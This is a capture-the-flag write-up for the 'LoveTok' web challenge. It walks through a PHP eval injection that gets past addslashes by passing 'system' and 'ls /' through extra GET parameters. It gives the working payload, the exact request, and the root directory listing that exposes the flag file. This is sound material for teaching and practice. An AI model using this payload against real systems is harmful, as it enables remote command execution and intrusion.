> True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛

1. The challenge gave us a website with only one page and it had a parameter `format`.

2. After analyzing the source code, we knew something and where to attack.
   1. The flag's location is defined `entrypoint.sh`.
   2. The `format` was used in `TimeModel`.
   3. The `format` was filtered via `addslashes` that add `/` before the characters `'`, `"`, `\`, and `NULL`.
   4. The `TimeController` called `getTime()` that contains `eval` function on `format` variable, which means we could use it for remote command execution.

```php
public function getTime()
{
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
    return isset($time) ? $time : 'Something went terribly wrong';
}
```

3. We tried to compose a `format` that could pass through `addslashes` and list filename first: 
   - We cannot use `"` and so we cannot directly use `system("ls /")`. Therefore, we use `$_GET` to create a new variable and it won't be filtered.
   - `"` is disallowed and so we cannot end `date("` by adding `")`. Therefore, we use functions like `echo` or `var_dump` to print the content to the page.
   - Since we will use `$_GET` to pass `"system"` string and thus we need to execute `eval($_GET[0]($_GET[1]))`.
   - To make the inner `eval` execute first, we use `${}` to make it happen.

```php
echo(${eval($_GET[1]($_GET[2]))})
```

4. We can send out the request as follows.

```
GET http://165.232.38.49:30685/?format=echo(${eval($_GET[1]($_GET[2]))})&1=system&2=ls+/ HTTP/1.1

bin
boot
dev
entrypoint.sh
etc
flag8h5ju
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```
